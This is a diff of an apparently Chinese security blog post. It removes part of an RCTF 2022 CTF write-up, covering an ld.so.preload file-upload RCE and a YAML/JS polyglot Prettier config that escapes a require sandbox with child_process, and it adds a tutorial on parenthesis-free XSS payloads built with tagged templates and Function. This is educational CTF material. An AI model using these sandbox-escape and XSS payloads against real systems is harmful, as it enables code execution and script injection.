@@ -1,193 +1,82 @@
-``` py
-os.path.join("/tmp/a/", "b") # /tmp/a/b
-os.path.join("/tmp/a/", "/b") # /b
-```
+## 先從不需要括號開始
 
-因此可以不需要有 `..` 就把檔案上傳到任意地方，只要隨便寫個 C program 把 `/bin/file` 蓋掉就好了。
+在 JavaScript 中似乎要執行函式就一定要括號，那如果不能用括號該怎麼辦呢？
 
-### promax
+### Tagged template strings
 
-這題把剛剛的漏洞修了一半，變成只要檔案存在就不讓你上傳，所以不能蓋掉，只能上傳新東西。
-
-此時我們還是往上一題之前想的方向去找，看怎麼運用現有機制，結果另一個隊友說他有個可能是非預期的解法，就解掉了。
-
-原理是可以上傳檔案到 `/etc/ld.so.preload`，裡面內容放 `/tmp/a.so` 之類的，然後再上傳另一個檔案到 `/tmp/a.so`，此時 binary 在執行前就會先載入裡面的程式碼。
-
-這邊記一下 DC 裡面 lavish 的詳細回答：
-
-1. `os.path.join(app.config['UPLOAD_FOLDER'], f.filename)` allows for arbitrary file upload when f.filename is an absolute path.
-2. unlike filechecker_plus, you can't now overwrite existing files such as `/bin/file`, so you have to identify a way to obtain RCE by uploading a file that does not previously exist on the filesystem
-3. if you strace an execution of `/bin/file`, you will notice that it tries to open (like any other executable) the `/etc/ld.so.preload` file. Have a look with `strace file -b <whatever> |& grep ENOENT` -> `access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)`
-4.  `/etc/ld.so.preload` is used to specify a list of shared libraries that are preloaded when any executable is run
-5. at this point, you need to craft an .so that prints the flag, upload it to a random location on the fs, upload a `/etc/ld.so.preload` containing the path to your .so and execute file again so that the flag is returned
-6. since files are deleted after being uploaded, you need to exploit a race condition. You should also ensure that  file does a clean exit, otherwise subprocess.check_output will raise an exception
-
-以前其實沒用過 strace，發現還滿好用的，簡單記錄一下用法：
-
-1. `strace file -b <whatever> |& grep ENOENT`
-2. `strace file /etc/passwd 2>&1 | grep "No such file or directory"`
-
-可以看到呼叫了哪些 system call & 去動了哪些檔案
-
-因為這個解法似乎跟 file 沒太大關係，導致我們一直認為是非預期，最後發現其實是預期解。
-
-作者 writeup：https://github.com/L1aovo/my-ctf-challenges/tree/main/RCTF2022
-
-## PrettierOnline
-
-先說結論，我滿喜歡這題的
-
-主要程式碼在這邊：
+第一種方法有些開發者應該用過，但可能一時不會想到。某些 JavaScript 的 library 會用 template strings 來執行函式，如 [Postgres.js](https://github.com/porsager/postgres?tab=readme-ov-file#usage)：
 
 ``` js
-const fs = require('fs')
-const crypto = require('crypto')
-const prettier = require('prettier')
-const { nextTick, exit } = require('process')
-require('./fw')
-
-const id = fs.readFileSync('./dist/id', 'utf-8').toString('utf-8').trim()
-fs.unlinkSync('./dist/id')
-prettier.resolveConfig(`${__dirname}/.prettierrc`).then(config => {
-  const ret = prettier.format(fs.readFileSync(__filename, 'utf-8'), config)
-  const o = crypto.createHash('sha256').update(Buffer.from(id, 'utf-8')).digest().toString('hex')
-  fs.writeFileSync(`./dist/${id}`, o, 'utf-8')
-  fs.writeFileSync('./dist/ret.js', ret, 'utf-8')
-  nextTick(() => {
-    throw new Error('No NextTick here!')
-  })
-  exit(0)
-})
-```
-
-簡單來說就是載入設定檔以後跑 prettier，這題你唯一能控制的就是這個設定檔。
-
-然後 `./fw.js` 裡面是去 patch `require`：
-
-``` js
-const Module = require('module')
-const oldRequire = Module.prototype.require
-Module.prototype.require = function (id) {
-  if (typeof id !== 'string') {
-    throw new Error('Bye')
-  }
-  const isCore = Module.isBuiltin(id)
-  if (isCore) {
-    if (!/fs|path|util|os/.test(id)) {
-      throw new Error('Bye, ' + id)
-    }
-  } else {
-    id = Module._resolveFilename(id, this)
-  }
-  return oldRequire.call(oldRequire, id)
-}
-process.dlopen = () => {}
-```
-
-既然是有關 prettier config，第一步當然是先看官方文件：https://prettier.io/docs/en/configuration.html
-
-當時有點看到幾個點：
-
-1. 支援 YAML
-2. 有一個 Sharing configurations 的東西，只放一個字串就會改成去 require 那個字串
-
-第二點例如說你的 `.prettierrc` 長這樣：
-
-```
-hello
-```
-
-跑 prettier 的時候就會出現：`Error: Cannot find module 'hello'`
-
-但因為 server 上也沒其他檔案可以控制，所以沒發現可以幹嘛，就繼續研究 prettier 到底做了什麼事情，花了一些時間開 debugger 去 trace，發現就算你丟的是 JSON，一樣是先走到 `yaml.parse` 去解析你的程式碼（沒什麼用的發現就是了）
-
-後來東看西看，發現外加想起來有 plugin 這種東西，就寫了這樣的設定檔：
-
-```
-{
-  "plugins": ["abc"]
+async function getUsersOver(age) {
+  const users = await sql`
+    select
+      name,
+      age
+    from users
+    where age > ${ age }
+  `
+  // users = Result [{ name: "Walter", age: 80 }, { name: 'Murray', age: 68 }, ...]
+  return users
 }
 ```
 
-出現錯誤訊息 `Error: Cannot find module 'abc'`，代表 prettier 會去 require plugin 沒有錯。
+不懂的人乍看之下會想說怎麼這樣寫，難道不是個 SQL injection 漏洞嗎？
 
-那我們要 require 什麼？此時我想到我們可以 require 唯一能控制的檔案：`.prettierrc`，也就是說如果 `.prettierrc` 同時是設定檔又是 JS 就行了。
-
-幸好這在 yaml 裡面很容易：
-
-``` yaml
-plugins:
-  - ".prettierrc"
-abc:
-  - console.log(1)
-```
-
-`plgusin:` 在 JS 裡面是標籤，`-` 是減號，所以完全沒問題。做到這裡我就覺得這題滿有趣的，把 JS+yaml polyglot 這概念再加上 real world 的 prettier 當作範例。
-
-可以執行程式碼以後，就要看怎麼繞 require 的限制，我試過 `import()` 但沒作用，後來想了一下，既然都可以執行任意 JS，就隨便亂改一波就好了，像這樣：
-
-``` yaml
-plugins:
-  - ".prettierrc"
-abc:
-  - eval("h=RegExp.prototype.test;RegExp.prototype.test=function(v){return v == 'child_process' ? true : h.call(this,v)};f=require('child_process').execSync('/readflag').toString();fs=require('fs');w=fs.writeFileSync;fs.writeFileSync=function(a,b,c){ if(a=='./dist/ret.js'){b=f}; return w.call(fs,a,b,c) }")
-```
-
-好讀版：
+如果只用了 template strings 的話，那確實是，但注意前面多了個 `sql`，這就不一樣了，就不只是單純的字串拼接，而是函式執行了，是一個 JavaScript 的語法，可以看底下範例：
 
 ``` js
-h = RegExp.prototype.test;
-RegExp.prototype.test = function(v){
- return v == 'child_process' ? true : h.call(this,v)
-};
-
-f = require('child_process').execSync('/readflag').toString();
-
-fs = require('fs');
-w = fs.writeFileSync;
-fs.writeFileSync=function(a,b,c){
-  if(a == './dist/ret.js'){
-    b = f
-  };
-  return w.call(fs,a,b,c)
+function test(...args){
+    console.log(args)
 }
+
+test`Hello ${'huli'}!!!${'good'}~~`
+// [['Hello ', '!!!', '~~'], 'huli', 'good']
 ```
 
-先把 `RegExp.test` 改掉，就可以 require 任意東西，接著再讓 `fs.writeFileSync` 的時候內容會被換成 flag，最後就能拿到 flag 了。
+當我們在前面加上一個函式時，函式的參數會收到原始字串中固定的部分，以及被插入的變數，就可以直接用這些資訊做 sanitization，來避免 SQL injection，這種用法叫做 tagged templates strings。
 
-作者 writeup：https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2022/prettieronline
+最後達成的效果就是看起來只是字串取代，但背後是函式執行而且有做 sanitization，所以其實是安全的。
 
-發現 require 根本不用繞，用 `module.constructor._load('child_process')` 其實就可以了，因為 require 裡面也是再去呼叫這個 _load 的方法：https://github.com/nodejs/node/blob/265ea1e74ef429f7c27f05ac4cc9136adf2e8d9b/lib/internal/modules/cjs/loader.js
+利用這個概念，就可以寫出不需要括號的 XSS payload：
 
 ``` js
-// Loads a module at the given file path. Returns that module's
-// `exports` property.
-Module.prototype.require = function(id) {
-  validateString(id, 'id');
-  if (id === '') {
-    throw new ERR_INVALID_ARG_VALUE('id', id,
-                                    'must be a non-empty string');
-  }
-  requireDepth++;
-  try {
-    return Module._load(id, this, /* isMain */ false);
-  } finally {
-    requireDepth--;
-  }
-};
+alert`test`
 ```
 
-最後還有一個 Nu1L 的 payload 也很炫：
+但有些人會問說，這樣的話就只能執行 alert 而已，有沒有辦法執行任意程式碼呢？例如說 fetch 好了，我如果想要 POST 的話，一定要用到第二個參數：`fetch(url, { method:'POST'})`，而上面的方法第二個參數會是個陣列，因此 fetch 會報錯，就跑不動了。
 
+針對這個問題，我們可以先利用 function constructor，傳入字串來建立一個函式，不熟這個的之後可以去讀：[如何不用英文字母與數字寫出 console.log(1)？](https://blog.huli.tw/2020/12/01/write-conosle-log-1-without-alphanumeric/)或是[Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼](https://blog.huli.tw/2021/06/07/xss-challenge-by-intigriti-writeup-may/)，但我還是先簡單介紹一下。
+
+在 JavaScript 中，可以用 `new Function(code)` 來動態建立出一個函式：
+
+``` js
+new Function('alert(1)')
+// anonymous() { alert(1) }
 ```
-/*/../app/.prettierrc
-#*/const fs = require('fs'); var a = fs.readFileSync("flag", "utf-8");fs.writeFileSync("./dist/ret.js",a);fs.chmodSync("./dist/ret.js",0o444);process.addListener('uncaughtException', (err) => {console.log("ss",err);process.exit(0);})
+
+而那個 new 其實不是必須的，拿掉也無妨。再者，動態建立的函式是可以傳參數的：
+
+``` js
+new Function('a', 'alert(a+1)')
+// anonymous(a) { alert(a+1) }
+
+new Function('a', 'b', 'alert(a+b)')
+// anonymous(a,b) { alert(a+b) }
 ```
 
-這個利用了我開頭講的輸出一個字串就會 require，背後也是先用 yaml parse 所以 `#` 後面是註解，然後路徑的部分用了 `/*` 搭配第二行的 `*/` 結合變成合法 JS，tql！
+最後一個參數會被當作實際的程式碼，前面的都會被當成是函式的參數，並且回傳建立好的函式。
 
+因此，我們可以利用這點搭配剛剛講的 tagged templates，從字串建立函式：
 
-最後附上其他有找到的 writeup：
+``` js
+Function`alert(1)`
+// anonymous() { alert(1) }
+```
 
-1. [RCTF 2022 WriteUp By F61d](https://www.ctfiot.com/85535.html)
-2. [2022RCTF WriteUp by Venom](https://cn-sec.com/archives/1460829.html)
+那這個建立出來的函式，要怎麼執行呢？很簡單，再用一次相同作法就好：
+
+``` js
+// 最後多加兩個 ``，就跟前面講過的 alert`1` 用法一樣
+// 怕 markdown parser 出錯，多加一個空格，但有沒有都一樣
+Function`alert(1)` ``
+```
